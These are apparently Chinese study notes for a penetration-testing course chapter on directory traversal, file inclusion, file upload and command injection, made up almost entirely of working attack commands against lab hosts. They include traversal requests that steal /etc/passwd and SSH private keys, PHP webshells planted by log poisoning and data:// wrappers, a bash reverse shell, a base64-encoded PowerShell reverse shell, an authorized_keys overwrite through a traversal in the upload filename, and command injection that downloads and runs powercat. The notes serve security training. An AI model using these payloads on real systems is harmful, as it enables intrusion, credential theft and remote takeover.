本篇对应教材第9章，主要内容“目录穿越”、“文件包含”、“文件上传”和“命令执行”，记录使用工具和命令

## 9.1 目录穿越

### 9.1.2 目录穿越利用

```python
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

```python
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

ssh -i dt_key -p 2222 offsec@mountaindesserts.com
提示权限不对
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

‍

### 9.1.3 编码

url编码

```python
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
不成功，可以尝试url编码

curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## 9.2 文件包含

### 9.2.1 本地文件包含

```python
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

User Agent加入webshell

```python
<?php echo system($_GET['cmd']); ?>
```

文件会写入

```python
../../../../../../../../../var/log/apache2/access.log
```

```python
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
```

反弹shell

```python
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

URL编码

```python
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

### 9.2.2 PHP包装器

文件读取

```python
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

base64解码

```python
echo "PCFET0NUWVBFIGh……" | base64 -d
```

命令执行

```python
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

base64编码

```python
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### 9.2.3 远程文件包含

```python
/usr/share/webshells/php/simple-backdoor.php
python3 -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

## 9.3 文件上传

### 9.3.1 可执行文件

文件后缀

```python
.phps
.php7
.php
.phtml
.pHP
```

修改后缀上传

```python
/usr/share/webshells/php/simple-backdoor.pHP
```

windows下base64编码后命令执行

```python
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

编码后使用webshell执行

```python
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

### 9.3.2 不可执行文件

post上传，文件名目录穿越

```python
../../../../../../../test.txt
```

生成ssh秘钥

```python
ssh-keygen
fileup
cat fileup.pub > authorized_keys
```

文件名改为

```python
../../../../../../../root/.ssh/authorized_keys
```

上传后，ssh连接

```python
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com
```

注意：fileup文件权限，600或者400

## 9.4 命令执行

### 9.4.1 命令注入

参数注入命令

```python
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```

提示不可执行，尝试正常命令git

```python
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```

执行成功，使用%3B拼接命令

```python
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

判断当前shell是cmd还是powershell

```python
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

url编码后

```python
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

输出是PowerShell

执行成功，使用powercat获得反弹shell

```python
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444
```

powershell执行

```python
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

url编码

```python
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
